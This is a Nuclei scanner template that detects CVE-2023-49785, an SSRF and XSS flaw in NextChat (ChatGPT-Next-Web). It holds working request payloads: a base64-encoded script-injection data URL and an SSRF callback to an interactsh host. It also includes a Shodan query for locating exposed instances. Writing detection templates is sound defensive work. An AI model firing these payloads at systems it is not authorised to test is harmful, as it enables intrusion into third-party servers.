id: CVE-2023-49785

info:
  name: ChatGPT-Next-Web - SSRF/XSS
  author: high
  severity: critical
  description: |
    Full-Read SSRF/XSS in NextChat, aka ChatGPT-Next-Web
  remediation: |
    Do not expose to the Internet
  reference:
    - https://www.horizon3.ai/attack-research/attack-blogs/nextchat-an-ai-chatbot-that-lets-you-talk-to-anyone-you-want-to/
    - https://github.com/ChatGPTNextWeb/ChatGPT-Next-Web
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N
    cvss-score: 9.1
    cve-id: CVE-2023-49785
    cwe-id: CWE-79
    epss-score: 0.93382
    epss-percentile: 0.99803
  metadata:
    verified: true
    max-request: 2
    shodan-query: "title:NextChat,\"ChatGPT Next Web\""
  tags: cve,cve2023,ssrf,xss,chatgpt,nextchat,vkev,vuln

http:
  - method: GET
    path:
      - "{{BaseURL}}/api/cors/data:text%2fhtml;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+%23"
      - "{{BaseURL}}/api/cors/http:%2f%2fnextchat.{{interactsh-url}}%23"

    matchers-condition: or
    matchers:
      - type: dsl
        dsl:
          - contains(body_1, "<script>alert(document.domain)</script>")
          - contains(header_1, "text/html")
        condition: and

      - type: dsl
        dsl:
          - contains(header_2,'X-Interactsh-Version')
          - contains(interactsh_protocol_2,'dns')
        condition: and
# digest: 4b0a00483046022100f58ca21abd731f7301ecdbdd8b9a161ae721faf82c6f3b46e0b269387c852e5a022100d2f019da97b8a4ef453c6cb1a150cc887584d446a6fa7f969e8a4eb24e32fea6:922c64590222798bb761d5b6d8e72950